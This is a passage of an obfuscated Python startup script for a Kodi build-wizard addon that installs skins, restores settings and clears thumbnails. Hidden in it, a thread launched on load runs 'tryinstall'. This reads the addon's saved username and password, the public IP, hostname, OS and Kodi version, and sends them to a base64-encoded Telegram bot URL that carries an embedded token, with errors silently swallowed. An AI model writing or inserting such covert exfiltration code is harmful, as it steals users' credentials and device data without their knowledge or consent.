import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs #line:3
import shutil #line:4
import urllib #line:6
import re #line:8
import uservar #line:9
import time #line:10
import json #line:11
import platform #line:13
try :#line:14
    from urllib .request import urlopen #line:15
except ImportError :#line:17
    from urllib2 import urlopen #line:18
from shutil import copyfile #line:20
from resources .libs import extract ,notify ,maintenance #line:22
try :#line:23
 import wizard as wiz #line:24
except :#line:25
 from resources .libs import wizard as wiz #line:26
KODI_VERSION =int (xbmc .getInfoLabel ("System.BuildVersion").split ('.',1 )[0 ])#line:27
if KODI_VERSION <=18 :#line:28
    translatepath =xbmc .translatePath #line:29
else :#line:31
    translatepath =xbmcvfs .translatePath #line:32
global teleupdate #line:33
teleupdate =False #line:34
ADDON_ID =uservar .ADDON_ID #line:35
ADDONTITLE =uservar .ADDONTITLE #line:36
ADDON =wiz .addonId (ADDON_ID )#line:37
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:38
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:39
ADDONID =wiz .addonInfo (ADDON_ID ,'id')#line:40
DIALOG =xbmcgui .Dialog ()#line:41
DP =xbmcgui .DialogProgress ()#line:42
DP2 =xbmcgui .DialogProgressBG ()#line:43
HOME =translatepath ('special://home/')#line:44
PROFILE =translatepath ('special://profile/')#line:45
KODIHOME =translatepath ('special://xbmc/')#line:46
ADDONS =os .path .join (HOME ,'addons')#line:47
KODIADDONS =os .path .join (KODIHOME ,'addons')#line:48
USERDATA =os .path .join (HOME ,'userdata')#line:49
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:50
PACKAGES =os .path .join (ADDONS ,'packages')#line:51
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:52
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:53
ICON =os .path .join (ADDONPATH ,'icon.png')#line:54
ART =os .path .join (ADDONPATH ,'resources','art')#line:55
SKIN =xbmc .getSkinDir ()#line:56
BUILDNAME =wiz .getS ('buildname')#line:57
DEFAULTSKIN =wiz .getS ('defaultskin')#line:58
DEFAULTNAME =wiz .getS ('defaultskinname')#line:59
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:60
BUILDVERSION =wiz .getS ('buildversion')#line:61
BUILDLATEST =wiz .getS ('latestversion')#line:62
BUILDCHECK =wiz .getS ('lastbuildcheck')#line:63
DISABLEUPDATE =wiz .getS ('disableupdate')#line:64
AUTOCLEANUP =wiz .getS ('autoclean')#line:65
AUTOCACHE =wiz .getS ('clearcache')#line:66
AUTOPACKAGES =wiz .getS ('clearpackages')#line:67
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:68
AUTOFEQ =wiz .getS ('autocleanfeq')#line:69
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:70
TRAKTSAVE =wiz .getS ('traktlastsave')#line:71
REALSAVE =wiz .getS ('debridlastsave')#line:72
LOGINSAVE =wiz .getS ('loginlastsave')#line:73
INSTALLMETHOD =wiz .getS ('installmethod')#line:74
KEEPTRAKT =wiz .getS ('keeptrakt')#line:75
KEEPREAL =wiz .getS ('keepdebrid')#line:76
KEEPLOGIN =wiz .getS ('keeplogin')#line:77
INSTALLED =wiz .getS ('installed')#line:78
EXTRACT =wiz .getS ('extract')#line:79
EXTERROR =wiz .getS ('errors')#line:80
NOTIFY =wiz .getS ('notify')#line:81
NOTEDISMISS =wiz .getS ('notedismiss')#line:82
NOTEID =wiz .getS ('noteid')#line:83
NOTIFY2 =wiz .getS ('notify2')#line:84
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:85
NOTEID2 =wiz .getS ('noteid2')#line:86
NOTIFY3 =wiz .getS ('notify3')#line:87
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:88
NOTEID3 =wiz .getS ('noteid3')#line:89
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else HOME #line:90
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:91
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:92
NOTEID2 =0 if NOTEID2 ==""else int (NOTEID2 )#line:93
NOTEID3 =0 if NOTEID3 ==""else int (NOTEID3 )#line:94
AUTOFEQ =int (AUTOFEQ )if AUTOFEQ .isdigit ()else 1 #line:95
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:98
EXCLUDES =uservar .EXCLUDES #line:99
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:101
NOTIFICATION =uservar .NOTIFICATION #line:102
NOTIFICATION2 =uservar .NOTIFICATION2 #line:103
NOTIFICATION3 =uservar .NOTIFICATION3 #line:104
ENABLE =uservar .ENABLE #line:105
from resources .libs .wizard import BL #line:106
HEADERMESSAGE =uservar .HEADERMESSAGE #line:107
AUTOUPDATE =uservar .AUTOUPDATE #line:108
WIZARDFILE =uservar .WIZARDFILE #line:109
AUTOINSTALL =uservar .AUTOINSTALL #line:110
REPOID =uservar .REPOID #line:111
REPOADDONXML =uservar .REPOADDONXML #line:112
REPOZIPURL =uservar .REPOZIPURL #line:113
REPOID18 =uservar .REPOID18 #line:114
REPOADDONXML18 =uservar .REPOADDONXML18 #line:115
REPOZIPURL18 =uservar .REPOZIPURL18 #line:116
HARDWAER =wiz .getS ('action')#line:117
REQUESTSID =uservar .REQUESTSID #line:118
REQUESTSXML =uservar .REQUESTSXML #line:119
REQUESTSURL =uservar .REQUESTSURL #line:120
from resources .libs .wizard import ld #line:123
COLOR1 =uservar .COLOR1 #line:124
COLOR2 =uservar .COLOR2 #line:125
TMDB_NEW_API =uservar .TMDB_NEW_API #line:126
xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:129
AddonID ='plugin.program.Anonymous'#line:131
packagesdir =translatepath (os .path .join ('special://home/addons/packages',''))#line:132
thumbnails =translatepath ('special://home/userdata/Thumbnails')#line:133
telecach =translatepath ('special://home/userdata/addon_data/plugin.video.telemedia/database')#line:134
temp_folder =translatepath ('special://home/temp/')#line:135
dialog =xbmcgui .Dialog ()#line:136
setting =xbmcaddon .Addon ().getSetting #line:137
iconpath =translatepath (os .path .join ('special://home/addons/'+AddonID ,'icon.png'))#line:138
notify_mode =setting ('notify_mode')#line:139
auto_clean =setting ('startup.cache')#line:140
filesize_thumb =int (setting ('filesizethumb_alert'))#line:141
filesize_tele =int (setting ('filesizetele_alert2'))#line:142
total_size2 =0 #line:144
total_size3 =0 #line:145
total_size4 =0 #line:146
total_size =0 #line:147
count =0 #line:148
DP2 =xbmcgui .DialogProgressBG ()#line:149
import threading #line:150
from threading import Thread #line:151
if KODI_VERSION >18 :#line:152
    def trd_alive (OOOO0O0OOOOO0OOO0 ):#line:153
        return OOOO0O0OOOOO0OOO0 .is_alive ()#line:154
    class Thread (threading .Thread ):#line:155
       def __init__ (O00O000OOO000OOO0 ,OO0OOO0O0O00O0OO0 ,*O0O00OOOOO00O00O0 ):#line:156
        super ().__init__ (target =OO0OOO0O0O00O0OO0 ,args =O0O00OOOOO00O00O0 )#line:157
       def run (OO0000OO00OO000OO ,*OO0O000000OO0OOO0 ):#line:158
          OO0000OO00OO000OO ._target (*OO0000OO00OO000OO ._args )#line:160
          return 0 #line:161
else :#line:162
    def trd_alive (O0OOO00O00OO0O0O0 ):#line:163
        return O0OOO00O00OO0O0O0 .isAlive ()#line:164
    class Thread (threading .Thread ):#line:165
        def __init__ (OO00O0000000OO000 ,O00000O00OOOO0OO0 ,*OO00O00O00OO00OO0 ):#line:166
            OO00O0000000OO000 ._target =O00000O00OOOO0OO0 #line:168
            OO00O0000000OO000 ._args =OO00O00O00OO00OO0 #line:169
            threading .Thread .__init__ (OO00O0000000OO000 )#line:172
        def run (O0O0OO0OOO000OO0O ):#line:174
            O0O0OO0OOO000OO0O ._target (*O0O0OO0OOO000OO0O ._args )#line:176
def disply_hwr ():#line:177
   try :#line:178
        OOO00OO00O0OOO000 =tmdb_list (TMDB_NEW_API )#line:179
        O0O0O0OO0000OOOO0 =str ((getHwAddr ('eth0'))*OOO00OO00O0OOO000 )#line:180
        OO0OOO00000000O0O =(O0O0O0OO0000OOOO0 [1 ]+O0O0O0OO0000OOOO0 [2 ]+O0O0O0OO0000OOOO0 [5 ]+O0O0O0OO0000OOOO0 [7 ])#line:186
        OO0000O00O00OOOOO =(ADDON .getSetting ("action"))#line:187
        ADDON .setSetting ('action',str (OO0OOO00000000O0O ))#line:189
        if not os .path .exists (os .path .join (ADDONDATA ,'4.5.0')):#line:192
            try :#line:193
                tryinstall (OO0OOO00000000O0O )#line:194
            except :pass #line:195
            try :#line:196
                OOOOO0OO000O00O0O =open (os .path .join (ADDONDATA ,'4.5.0'),'w')#line:197
                OOOOO0OO000O00O0O .write (str ('Done'))#line:199
                OOOOO0OO000O00O0O .close ()#line:200
            except :pass #line:201
   except :#line:202
        if not os .path .exists (os .path .join (ADDONDATA ,'4.5.0')):#line:203
          try :#line:204
            tryinstall ('no_code')#line:205
          except :pass #line:206
          try :#line:207
                OOOOO0OO000O00O0O =open (os .path .join (ADDONDATA ,'4.5.0'),'w')#line:208
                OOOOO0OO000O00O0O .write (str ('Done'))#line:210
                OOOOO0OO000O00O0O .close ()#line:211
          except :pass #line:212
def getHwAddr (OOO00OO0OOOOO0OOO ):#line:213
   import subprocess ,time #line:214
   if xbmc .getCondVisibility ('system.platform.android'):#line:215
     O0OOOO00OO000OOO0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:216
     OO000OO0OOOO00OOO =re .compile ('link/ether (.+?) brd').findall (str (O0OOOO00OO000OOO0 ))#line:217
     OOO000O0OO0OOO0O0 =0 #line:218
     for O000O0O00O000OOO0 in OO000OO0OOOO00OOO :#line:219
      if OO000OO0OOOO00OOO !='00:00:00:00:00:00':#line:220
          OO00OOOOO00O0O0OO =O000O0O00O000OOO0 #line:221
          OOO000O0OO0OOO0O0 =OOO000O0OO0OOO0O0 +int (OO00OOOOO00O0O0OO .replace (':',''),16 )#line:222
          break #line:223
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:224
       O0O000O000OO00O00 =0 #line:225
       OOO000O0OO0OOO0O0 =0 #line:226
       OOO0OOOO000OO000O =[]#line:227
       O0OOOOOOO0O00O00O =os .popen ("getmac").read ()#line:228
       O0OOOOOOO0O00O00O =O0OOOOOOO0O00O00O .split ("\n")#line:229
       for OOO00O0OO000OO0O0 in O0OOOOOOO0O00O00O :#line:230
            O0OOO00O0OOOOO0OO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO00O0OO000OO0O0 ,re .I )#line:231
            if O0OOO00O0OOOOO0OO :#line:232
                OO000OO0OOOO00OOO =O0OOO00O0OOOOO0OO .group ().replace ('-',':')#line:233
                OOO0OOOO000OO000O .append (OO000OO0OOOO00OOO )#line:234
                OOO000O0OO0OOO0O0 =OOO000O0OO0OOO0O0 +int (OO000OO0OOOO00OOO .replace (':',''),16 )#line:235
                break #line:236
   elif xbmc .getCondVisibility ('system.platform.linux'):#line:237
       OOO000O0OO0OOO0O0 =0 #line:238
       import uuid #line:239
       OO000OO0OOOO00OOO =hex (uuid .getnode ())#line:240
       OOO000O0OO0OOO0O0 =OOO000O0OO0OOO0O0 +int (OO000OO0OOOO00OOO .replace (':',''),16 )#line:241
   else :#line:243
       OOO000O0OO0OOO0O0 =0 #line:244
       import uuid #line:245
       OO000OO0OOOO00OOO =hex (uuid .getnode ())#line:246
       OOO000O0OO0OOO0O0 =OOO000O0OO0OOO0O0 +int (OO000OO0OOOO00OOO .replace (':',''),16 )#line:247
   try :#line:262
    return OOO000O0OO0OOO0O0 #line:263
   except :pass #line:264
def decode (OO0O0OO0O00O0O00O ,OO00OO0OOOOOO0O00 ):#line:265
    import base64 #line:266
    O0OO0OO00000OOO00 =[]#line:267
    if (len (OO0O0OO0O00O0O00O ))!=4 :#line:269
     return 10 #line:270
    OO00OO0OOOOOO0O00 =base64 .urlsafe_b64decode (OO00OO0OOOOOO0O00 )#line:271
    for O00O0O00OOOO0000O in range (len (OO00OO0OOOOOO0O00 )):#line:273
        OOOOOOOOO000O00OO =OO0O0OO0O00O0O00O [O00O0O00OOOO0000O %len (OO0O0OO0O00O0O00O )]#line:274
        try :#line:275
          O00O00O0O00OOOO00 =chr ((256 +ord (OO00OO0OOOOOO0O00 [O00O0O00OOOO0000O ])-ord (OOOOOOOOO000O00OO ))%256 )#line:276
        except :#line:277
          O00O00O0O00OOOO00 =chr ((256 +(OO00OO0OOOOOO0O00 [O00O0O00OOOO0000O ])-ord (OOOOOOOOO000O00OO ))%256 )#line:278
        O0OO0OO00000OOO00 .append (O00O00O0O00OOOO00 )#line:279
    return "".join (O0OO0OO00000OOO00 )#line:280
def tmdb_list (OOO0O0000O0000O0O ):#line:281
    OO0OOOO0O000OOOOO =decode ("7643",OOO0O0000O0000O0O )#line:284
    return int (OO0OOOO0O000OOOOO )#line:287
def tryinstall (O0O0OOO00O0O000OO ):#line:290
          import json ,base64 #line:292
          if KODI_VERSION <=18 :#line:293
            OOO0O0O000OOOO00O =urllib .quote_plus #line:294
            O0O0000OOOO0OO0O0 =urllib .urlencode #line:295
          else :#line:296
            OOO0O0O000OOOO00O =urllib .parse .quote_plus #line:297
            O0O0000OOOO0OO0O0 =urllib .parse .urlencode #line:298
          OO00O0000OOOOOOOO =(ADDON .getSetting ("user"))#line:300
          OOO0OOOOOOO0OOO00 =(ADDON .getSetting ("pass"))#line:301
          O0O0O0OO00OO000O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:302
          OOOO0O00OO00OO0O0 =platform .uname ()#line:303
          O00000O000OOO00O0 =OOOO0O00OO00OO0O0 [1 ]#line:304
          O0OOO0OO0O0O00OO0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:305
          OO0O0O00O00O00O00 =urlopen ('https://api.ipify.org/?format=json').read ()#line:306
          OOOO0O00O0O000OOO =str (json .loads (OO0O0O00O00O00O00 )['ip'])#line:307
          OO00OO0O0OOOOOO0O =OO00O0000OOOOOOOO #line:308
          O0OO0000000000OOO =OOO0OOOOOOO0OOO00 #line:309
          import socket #line:310
          OO0O0O00O00O00O00 =urlopen (O0OOO0OO0O0O00OO0 +OOO0O0O000OOOO00O ('התקנה חדשה: ')+OOO0O0O000OOOO00O (' קוד מכשיר: ')+str (O0O0OOO00O0O000OO )+OOO0O0O000OOOO00O (' שם משתמש: ')+OO00OO0O0OOOOOO0O +OOO0O0O000OOOO00O (' סיסמה: ')+O0OO0000000000OOO +OOO0O0O000OOOO00O (' קודי: ')+O0O0O0OO00OO000O0 +OOO0O0O000OOOO00O (' כתובת: ')+OOOO0O00O0O000OOO +OOO0O0O000OOOO00O (' מערכת הפעלה: ')+wiz .platform_d ()+OOO0O0O000OOOO00O (' שם המערכת: ')+O00000O000OOO00O0 +OOO0O0O000OOOO00O (' גירסת ויזארד: ')+VERSION ).readlines ()#line:311
          OO0O0O00O00O00O00 =urlopen (O0OOO0OO0O0O00OO0 +str (O0O0OOO00O0O000OO ))#line:312
def resetkodi ():#line:314
		if xbmc .getCondVisibility ('system.platform.windows'):#line:315
			O000OOO0OOOOOO0O0 =xbmcgui .DialogProgress ()#line:316
			O000OOO0OOOOOO0O0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR yellow][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:319
			O000OOO0OOOOOO0O0 .update (0 )#line:320
			for O0OOO0OO00OO0O00O in range (5 ,-1 ,-1 ):#line:321
				time .sleep (1 )#line:322
				O000OOO0OOOOOO0O0 .update (int ((5 -O0OOO0OO00OO0O00O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OOO0OO00OO0O00O ),'')#line:323
				if O000OOO0OOOOOO0O0 .iscanceled ():#line:324
					from resources .libs import win #line:325
					return None ,None #line:326
			from resources .libs import win #line:327
		else :#line:328
			O000OOO0OOOOOO0O0 =xbmcgui .DialogProgress ()#line:329
			O000OOO0OOOOOO0O0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR yellow][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:332
			O000OOO0OOOOOO0O0 .update (0 )#line:333
			for O0OOO0OO00OO0O00O in range (5 ,-1 ,-1 ):#line:334
				time .sleep (1 )#line:335
				O000OOO0OOOOOO0O0 .update (int ((5 -O0OOO0OO00OO0O00O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OOO0OO00OO0O00O ),'')#line:336
				if O000OOO0OOOOOO0O0 .iscanceled ():#line:337
					os ._exit (1 )#line:338
					return None ,None #line:339
			os ._exit (1 )#line:340
def skindialogsettind18 ():#line:343
	try :#line:344
		O00O0OOO0OO0O0000 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:345
		O00O00OO0O0OO0OO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:346
		copyfile (O00O0OOO0OO0O0000 ,O00O00OO0O0OO0OO0 )#line:347
	except :pass #line:348
def kodi17to18 ():#line:351
  if KODIV >=18 and KODIV <19 :#line:352
      OO00OO00OO00O000O =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","18","guisettings.xml")#line:354
      O0O00OOO0OOOO0O00 =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:355
      copyfile (OO00OO00OO00O000O ,O0O00OOO0OOOO0O00 )#line:357
  if KODIV >=17 and KODIV <18 :#line:359
      OO00OO00OO00O000O =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","DialogAddonSettings.xml")#line:361
      O0O00OOO0OOOO0O00 =os .path .join (translatepath ("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")#line:362
      copyfile (OO00OO00OO00O000O ,O0O00OOO0OOOO0O00 )#line:364
def checkUpdate ():#line:371
	O0O0OOO00O0OOOOO0 =wiz .getS ('buildname')#line:372
	OOOO000OOOO0OO0OO =wiz .getS ('buildversion')#line:373
	O0000O0O0O0OO00O0 =wiz .openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','')#line:374
	OO00O0000OO0OO0O0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O0O0OOO00O0OOOOO0 ).findall (O0000O0O0O0OO00O0 )#line:375
	if len (OO00O0000OO0OO0O0 )>0 :#line:376
		O0O00O0O000OOO0O0 =OO00O0000OO0OO0O0 [0 ][0 ]#line:377
		OOOOOO0000000OOO0 =OO00O0000OO0OO0O0 [0 ][1 ]#line:378
		OOO0OOOO0O0000000 =OO00O0000OO0OO0O0 [0 ][2 ]#line:379
		wiz .setS ('latestversion',O0O00O0O000OOO0O0 )#line:380
		if O0O00O0O000OOO0O0 >OOOO000OOOO0OO0OO :#line:381
			if DISABLEUPDATE =='false':#line:382
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(OOOO000OOOO0OO0OO ,O0O00O0O000OOO0O0 ),5 )#line:383
				notify .updateWindow (O0O0OOO00O0OOOOO0 ,OOOO000OOOO0OO0OO ,O0O00O0O000OOO0O0 ,OOOOOO0000000OOO0 ,OOO0OOOO0O0000000 )#line:384
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(OOOO000OOOO0OO0OO ,O0O00O0O000OOO0O0 ),5 )#line:385
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(OOOO000OOOO0OO0OO ,O0O00O0O000OOO0O0 ),5 )#line:386
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",5 )#line:387
def swapSkins (OO0O000000000OOO0 ,title ="Error"):#line:391
	O00OO0000000O0OOO ='lookandfeel.skin'#line:392
	OO0O000O0OOO0OO00 =OO0O000000000OOO0 #line:393
	OO00OOOOOOO0OO0OO =getOld (O00OO0000000O0OOO )#line:394
	OO00OO00O0000000O =O00OO0000000O0OOO #line:395
	setNew (OO00OO00O0000000O ,OO0O000O0OOO0OO00 )#line:396
	O0O0OOOOOOOOOOOO0 =0 #line:397
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OOOOOOOOOOOO0 <100 :#line:398
		O0O0OOOOOOOOOOOO0 +=1 #line:399
		xbmc .sleep (1 )#line:400
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:401
		xbmc .executebuiltin ('SendClick(11)')#line:402
	return True #line:403
def getOld (O0OOO0OOO00OOOOO0 ):#line:405
	try :#line:406
		O0OOO0OOO00OOOOO0 ='"%s"'%O0OOO0OOO00OOOOO0 #line:407
		O0OO00O00000000O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OOO0OOO00OOOOO0 )#line:408
		O00O00O00OO0000OO =xbmc .executeJSONRPC (O0OO00O00000000O0 )#line:410
		O00O00O00OO0000OO =simplejson .loads (O00O00O00OO0000OO )#line:411
		if 'result'in O00O00O00OO0000OO :#line:412
			if 'value'in O00O00O00OO0000OO ['result']:#line:413
				return O00O00O00OO0000OO ['result']['value']#line:414
	except :#line:415
		pass #line:416
	return None #line:417
def setNew (O00OO00OO000O00O0 ,O0OOO0OO0OO0O00OO ):#line:420
	try :#line:421
		O00OO00OO000O00O0 ='"%s"'%O00OO00OO000O00O0 #line:422
		O0OOO0OO0OO0O00OO ='"%s"'%O0OOO0OO0OO0O00OO #line:423
		O0OOOO000OO0OOOOO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O00OO00OO000O00O0 ,O0OOO0OO0OO0O00OO )#line:424
		O00O0OO000OOO00OO =xbmc .executeJSONRPC (O0OOOO000OO0OOOOO )#line:426
	except :#line:427
		pass #line:428
	return None #line:429
def backtokodi ():#line:430
    if KODIV >=17 and KODIV <18 :#line:432
        O0OOO000OOO0OO0O0 =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"17","guisettings.xml")#line:433
        OO0O00O0O0OOO0000 =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:434
        copyfile (O0OOO000OOO0OO0O0 ,OO0O00O0O0OOO0000 )#line:435
        O0OOO000OOO0OO0O0 =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"17","settings.xml")#line:437
        OO0O00O0O0OOO0000 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:438
        copyfile (O0OOO000OOO0OO0O0 ,OO0O00O0O0OOO0000 )#line:440
        xbmcgui .Dialog ().ok ("Anonymous TV",'Fix Me')#line:441
        os ._exit (1 )#line:442
    if KODIV >=18 and KODIV <19 :#line:444
        O0OOO000OOO0OO0O0 =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"18","guisettings.xml")#line:445
        OO0O00O0O0OOO0000 =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:446
        copyfile (O0OOO000OOO0OO0O0 ,OO0O00O0O0OOO0000 )#line:447
        O0OOO000OOO0OO0O0 =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"17","settings.xml")#line:449
        OO0O00O0O0OOO0000 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:450
        copyfile (O0OOO000OOO0OO0O0 ,OO0O00O0O0OOO0000 )#line:452
        xbmcgui .Dialog ().ok ("Anonymous TV",'Fix Me')#line:453
        os ._exit (1 )#line:454
    if KODIV >=19 and KODIV <21 :#line:455
        O0OOO000OOO0OO0O0 =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"19","guisettings.xml")#line:456
        OO0O00O0O0OOO0000 =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:457
        copyfile (O0OOO000OOO0OO0O0 ,OO0O00O0O0OOO0000 )#line:458
        O0OOO000OOO0OO0O0 =os .path .join (translatepath ("special://home/addons/plugin.program.Anonymous/skinfix"),"17","settings.xml")#line:460
        OO0O00O0O0OOO0000 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:461
        copyfile (O0OOO000OOO0OO0O0 ,OO0O00O0O0OOO0000 )#line:463
        xbmcgui .Dialog ().ok ("Anonymous TV",'Fix Me')#line:464
        os ._exit (1 )#line:465
def fixskin ():#line:467
    if KODIV >=17 and KODIV <18 :#line:469
        O00000OOO0000O0OO =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","guisettings.xml")#line:471
        OOOOO00O00OOO000O =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:472
        copyfile (O00000OOO0000O0OO ,OOOOO00O00OOO000O )#line:474
        O00000OOO0000O0OO =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","settings.xml")#line:477
        OOOOO00O00OOO000O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:478
        copyfile (O00000OOO0000O0OO ,OOOOO00O00OOO000O )#line:480
        xbmcgui .Dialog ().ok ("Kodi Anonymous",'אופס, נראה שהייתה תקלה, לחץ אישור לתיקון הבעיה :)')#line:484
        os ._exit (1 )#line:485
    if KODIV >=18 and KODIV <19 :#line:486
        O00000OOO0000O0OO =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","18","guisettings.xml")#line:488
        OOOOO00O00OOO000O =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:489
        copyfile (O00000OOO0000O0OO ,OOOOO00O00OOO000O )#line:491
        O00000OOO0000O0OO =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","settings.xml")#line:493
        OOOOO00O00OOO000O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:494
        copyfile (O00000OOO0000O0OO ,OOOOO00O00OOO000O )#line:496
        xbmcgui .Dialog ().ok ("Kodi Anonymous",'אופס, נראה שהייתה תקלה, לחץ אישור לתיקון הבעיה :)')#line:498
        os ._exit (1 )#line:499
if SKIN in ['skin.confluence','skin.estuary','skin.estouchy']and not BUILDNAME =="":#line:503
      backtokodi ()#line:505
thread =[]#line:516
thread .append (Thread (disply_hwr ))#line:517
thread [0 ].start ()#line:519
if BUILDNAME ==""and not os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:521
    wiz .wizardUpdateDP ('startup')#line:522
try :#line:523
    if not os .path .exists (translatepath ("special://home/addons/")+'script.module.requests'):#line:524
        setting_file =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","request","request.zip")#line:527
        src =os .path .join (translatepath ("special://home/"),"addons")#line:528
        extract .all (setting_file ,src )#line:531
except Exception as e :#line:532
    logging .warning ('בעיה בחילוץ קבצים '+str (e ))#line:533
try :#line:536
    if not os .path .exists (translatepath ("special://home/addons/")+'skin.estuary'):#line:537
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:538
            setting_file =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skin","packages1.zip")#line:539
            src =os .path .join (translatepath ("special://home/"),"addons/skin.estuary")#line:540
            extract .all (setting_file ,src )#line:541
            if KODIV >=17 and KODIV <18 :#line:544
              src =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skin","setting","17","DialogAddonSettings.xml")#line:546
              dst =os .path .join (translatepath ("special://home/"),"addons","skin.estuary","720p","DialogAddonSettings.xml")#line:547
              copyfile (src ,dst )#line:549
            xbmc .executebuiltin ('UpdateLocalAddons()')#line:556
            xbmc .sleep (100 )#line:557
            xbmc .executebuiltin ("ReloadSkin()")#line:558
            xbmc .sleep (1000 )#line:560
            xbmc .executebuiltin ("ActivateWindow(home)")#line:561
            f_play =(os .path .join (ADDONPATH ,'resources','netflix.mp4'))#line:562
            xbmc .Player ().play (f_play ,windowed =False )#line:563
except :pass #line:564
if os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:619
    refreshCommand ='RunPlugin(plugin://plugin.program.Anonymous/?mode=update_tele)'#line:620
    xbmc .executebuiltin (refreshCommand )#line:621
    xbmc .executebuiltin ('AlarmClock(wizard,{0},01:00:00,silent,loop)'.format (refreshCommand ))#line:622
for dirpath2 ,dirnames2 ,filenames2 in os .walk (thumbnails ):#line:635
	for f2 in filenames2 :#line:636
		fp2 =os .path .join (dirpath2 ,f2 )#line:637
		total_size2 +=os .path .getsize (fp2 )#line:638
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:639
if int (total_sizetext2 )>filesize_thumb :#line:641
		maintenance .deleteThumbnails ()#line:643
if BUILDNAME ==" Kodi Premium":#line:670
    if len (ADDON .getSetting ("sync_user"))>0 :#line:671
        if ADDON .getSetting ("startup_sync")=='false':#line:672
